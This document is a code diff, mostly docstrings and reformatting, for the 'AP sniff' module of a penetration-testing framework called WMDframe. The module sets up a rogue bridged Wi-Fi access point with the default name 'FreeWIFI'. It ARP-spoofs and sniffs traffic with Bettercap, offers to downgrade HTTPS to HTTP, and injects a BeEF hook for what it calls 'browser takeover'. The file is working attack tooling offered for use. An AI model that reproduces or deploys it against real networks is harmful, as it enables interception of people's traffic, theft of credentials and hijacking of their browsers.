@@ -2,10 +2,13 @@
 #
 # MIT - (c) 2016 ThomasTJ (TTJ)
 # Module for WMDframe
+#
+# Create an AccessPoint with Create_ap
+# Sniff the data with Bettercap
+# Inject js hook with BEEF
 
 
 # LIBRARIES
-import configparser
 import os                   # Running bettercap
 from time import sleep      # Just counting down before launch
 try:
@@ -23,18 +26,24 @@ except:
 # END LIBRARIES
 
 
-# VARIABLES
+# ==========================
+# Core START
+# ==========================
 config = core.config()
 BETTERCAP = (config['TOOLS']['BETTERCAP_SYM'])
 CREATEAP = (config['TOOLS']['CREATEAP_SYM'])
 BEEF = (config['TOOLS']['BEEF_SYM'])
 INTERFACE_NET = (config['NETWORK']['INTERFACE_NET'])
 INTERFACE_MON = (config['NETWORK']['INTERFACE_MON'])
-# END VARIABLES
+# ==========================
+# Core END
+# ==========================
 
 
 # OPTIONS
-class options():
+class Options():
+    """Main class for module."""
+
     Author = 'Thomas TJ (TTJ)'
     Name = 'AP sniff'
     Call = 'apsniff'
@@ -48,6 +57,7 @@ class options():
     Lastmodified = '2017/01/01'
 
     def __init__(self, interface_n, interface_s, gateway, sniffer, proxy, target, sniff_log, ap_name, ap_log, args_ap, args_sniff, beef):
+        """Define variables and show options on run."""
         self.interface_n = interface_n
         self.interface_s = interface_s
         self.gateway = gateway
@@ -64,66 +74,73 @@ class options():
 
     # Possible options
     def poss_opt(self):
+        """Possible options. These variables are checked when the user tries to 'set' an option."""
         return ('interface_n', 'interface_s', 'gateway', 'sniffer', 'proxy', 'target', 'sniff_log', 'ap_name', 'ap_log', 'beef', 'args_ap', 'args_sniff')
 
     # Show options
     def show_opt(self):
+        """Show the possible options."""
         print(
-            ''
-            + '\n\t' + bc.OKBLUE + ('%-*s %-*s %-*s %s' % (15, 'OPTION', 6, 'RQ', 15, 'VALUE', 'DESCRIPTION')) + bc.ENDC
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, '------', 6, '--', 15, '-----', '-----------'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'interface_n:', 6, 'y', 15, self.interface_n, 'Active interface for net-connection (normally cable/wifi)'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'interface_s:', 6, 'y', 15, self.interface_s, 'Interface for wifi (needs to able to goto monitor mode)'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'gateway:', 6, 'y', 15, self.gateway, 'Gateway, e.g. 192.168.1.1'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'sniffer:', 6, 'n', 15, self.sniffer, 'Activate sniffer - why not? (y/n)'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'proxy:', 6, 'n', 15, self.proxy, 'Downgrade HTTPS to HTTP for sniffing (y/n)'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'target:', 6, 'n', 15, self.target, 'Target IPs. Separate with ',' or subnet xx\\24'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'sniff_log:', 6, 'n', 15, self.sniff_log, 'Logfile for sniffed packets'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'ap_name:', 6, 'n', 15, self.ap_name, 'Name for AP (accesspoint)'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'ap_log:', 6, 'n', 15, self.ap_log, 'Logfile for AP (accesspoint)'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'beef:', 6, 'n', 15, self.beef, 'Inject BEEF for browser takeover (y/n)'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'args_ap:', 6, 'n', 15, self.args_ap, 'Free arguments for create_ap'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'args_sniff:', 6, 'n', 15, self.args_sniff, 'Free arguments for Bettercap'))
-            + '\n'
-            )
+            '' +
+            '\n\t' + bc.OKBLUE + ('%-*s %-*s %-*s %s' % (15, 'OPTION', 6, 'RQ', 15, 'VALUE', 'DESCRIPTION')) + bc.ENDC +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (15, '------', 6, '--', 15, '-----', '-----------')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'interface_n:', 6, 'y', 15, self.interface_n, 'Active interface for net-connection (normally cable/wifi)')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'interface_s:', 6, 'y', 15, self.interface_s, 'Interface for wifi (needs to able to goto monitor mode)')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'gateway:', 6, 'y', 15, self.gateway, 'Gateway, e.g. 192.168.1.1')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'sniffer:', 6, 'n', 15, self.sniffer, 'Activate sniffer - why not? (y/n)')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'proxy:', 6, 'n', 15, self.proxy, 'Downgrade HTTPS to HTTP for sniffing (y/n)')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'target:', 6, 'n', 15, self.target, 'Target IPs. Separate with ","" or subnet xx\\24')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'sniff_log:', 6, 'n', 15, self.sniff_log, 'Logfile for sniffed packets')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'ap_name:', 6, 'n', 15, self.ap_name, 'Name for AP (accesspoint)')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'ap_log:', 6, 'n', 15, self.ap_log, 'Logfile for AP (accesspoint)')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'beef:', 6, 'n', 15, self.beef, 'Inject BEEF for browser takeover (y/n)')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'args_ap:', 6, 'n', 15, self.args_ap, 'Free arguments for create_ap')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'args_sniff:', 6, 'n', 15, self.args_sniff, 'Free arguments for Bettercap')) +
+            '\n'
+        )
 
     # Show commands
     def show_commands(self):
+        """Show the possible commands."""
         print(
-            ''
-            + '\n\t' + bc.OKBLUE + 'COMMANDS:' + bc.ENDC
-            + '\n\t' + '---------'
-            + '\n\t' + ('%-*s ->\t%s' % (9, 'run', 'Run the script'))
-            + '\n\t' + ('%-*s ->\t%s' % (9, 'info', 'Information'))
-            + '\n\t' + ('%-*s ->\t%s' % (9, 'help', 'Help'))
-            + '\n\t' + ('%-*s ->\t%s' % (9, 'pd', 'Predefined arguments for "runcom"'))
-            + '\n\t' + ('%-*s ->\t%s' % (9, 'so', 'Show options'))
-            + '\n\t' + ('%-*s ->\t%s' % (9, 'sa', 'Show module info'))
-            + '\n\t' + ('%-*s ->\t%s' % (9, 'exit', 'Exit'))
-            + '\n'
-            )
+            '' +
+            '\n\t' + bc.OKBLUE + 'COMMANDS:' + bc.ENDC +
+            '\n\t' + '---------' +
+            '\n\t' + ('%-*s ->\t%s' % (9, 'run', 'Run the script')) +
+            '\n\t' + ('%-*s ->\t%s' % (9, 'info', 'Information')) +
+            '\n\t' + ('%-*s ->\t%s' % (9, 'help', 'Help')) +
+            '\n\t' + ('%-*s ->\t%s' % (9, 'pd', 'Predefined arguments for "runcom"')) +
+            '\n\t' + ('%-*s ->\t%s' % (9, 'so', 'Show options')) +
+            '\n\t' + ('%-*s ->\t%s' % (9, 'sa', 'Show module info')) +
+            '\n\t' + ('%-*s ->\t%s' % (9, 'exit', 'Exit')) +
+            '\n'
+        )
 
     # Show all info
     def show_all(self):
+        """Show all options.
+
+        Sending main options to the core module modules.py for parsing.
+        """
         cmodules.showModuleData(
-            options.Author,
-            options.Name,
-            options.Call,
-            options.Category,
-            options.Type,
-            options.Version,
-            options.Description,
-            options.License,
-            options.Datecreation,
-            options.Lastmodified
-            )
+            Options.Author,
+            Options.Name,
+            Options.Call,
+            Options.Category,
+            Options.Type,
+            Options.Version,
+            Options.Description,
+            Options.License,
+            Options.Datecreation,
+            Options.Lastmodified
+        )
         self.show_commands()
         self.show_opt()
 # END OPTIONS
 
 
-# RUN BETTERCAP
 def run():
+    """The main run function."""
     # Start the AP
     command = (CREATEAP + ' -m bridge -g ' + sop.gateway + ' ' + sop.interface_s + ' ' + sop.interface_n + ' ' + sop.ap_name + ' ')
 
@@ -134,12 +151,12 @@ def run():
         command += '>> logs/' + sop.ap_log
 
     print(
-        '\n'
-        + '\t' + 'Loading     : Create_ap'
-        + '\n\t' + 'Command     : ' + bc.BOLD + command + bc.ENDC
-        + '\n\t' + 'Starting in : 2 seconds'
-        + '\n\t'
-        )
+        '\n' +
+        '\t' + 'Loading     : Create_ap' +
+        '\n\t' + 'Command     : ' + bc.BOLD + command + bc.ENDC +
+        '\n\t' + 'Starting in : 2 seconds' +
+        '\n\t'
+    )
     sleep(2)
     comm.runCommand(command, 'Create_AP_with_create_ap')
 
@@ -180,28 +197,29 @@ def run():
 
     command = (BETTERCAP + ' ' + opt_com)
     print(
-        '\n'
-        + '\t' + 'Loading     : Bettercap'
-        + '\n\t' + 'Command     : ' + bc.BOLD + command + bc.ENDC
-        + '\n\t' + 'Starting in : 2 seconds'
-        + '\n\t'
-        )
+        '\n' +
+        '\t' + 'Loading     : Bettercap' +
+        '\n\t' + 'Command     : ' + bc.BOLD + command + bc.ENDC +
+        '\n\t' + 'Starting in : 2 seconds' +
+        '\n\t'
+    )
     sleep(2)
     comm.runCommand2(command, 'Bettercap_sniff')
 
     print(
+        '\n' +
+        '\t' + 'Status\t : Running' +
+        '\n\t' + 'Stop\t : Manually close X' +
+        '\n' +
+        '\n\t' + 'Type "back" to return to the main menu' +
         '\n'
-        + '\t' + 'Status\t : Running'
-        + '\n\t' + 'Stop\t : Manually close X'
-        + '\n'
-        + '\n\t' + 'Type "back" to return to the main menu'
-        + '\n'
-        )
+    )
     print('   -> ' + bc.FAIL + 'wmd' + bc.ENDC + '@' + bc.FAIL + 'APsniff:' + bc.ENDC + ' Module is RUNNING')
 # END BETTERCAP
 
 
 def info():
+    """Show the modules info - optional."""
     print('''
         This module consist of 3 programs:
          * Bettercap for sniffing packets
@@ -215,6 +233,7 @@ def info():
 
 # CONSOLE
 def console():
+    """The main console for the module."""
     value = input('   -> ' + bc.FAIL + 'wmd' + bc.ENDC + '@' + bc.FAIL + 'APsniff:' + bc.ENDC + ' ')
     userinput = value.split()
     if 'so' in userinput[:1]:
@@ -258,6 +277,7 @@ def console():
 
 # STARTER
 def main():
+    """The first function to run."""
     print('\n')
     print('\t    ___    ____                         _ ________  ')
     print('\t   /   |  / __ \     __     _________  (_) __/ __/  ')
@@ -278,5 +298,5 @@ def main():
     print('\n')
     gateway = comm.getGateway()
     global sop
-    sop = options(INTERFACE_NET, INTERFACE_MON, gateway, 'ARP', 'y', '', 'logs/sniff_log.txt', 'FreeWIFI', 'logs/ap_log.txt', '', '', '')
+    sop = Options(INTERFACE_NET, INTERFACE_MON, gateway, 'ARP', 'y', '', 'logs/sniff_log.txt', 'FreeWIFI', 'logs/ap_log.txt', '', '', '')
     console()
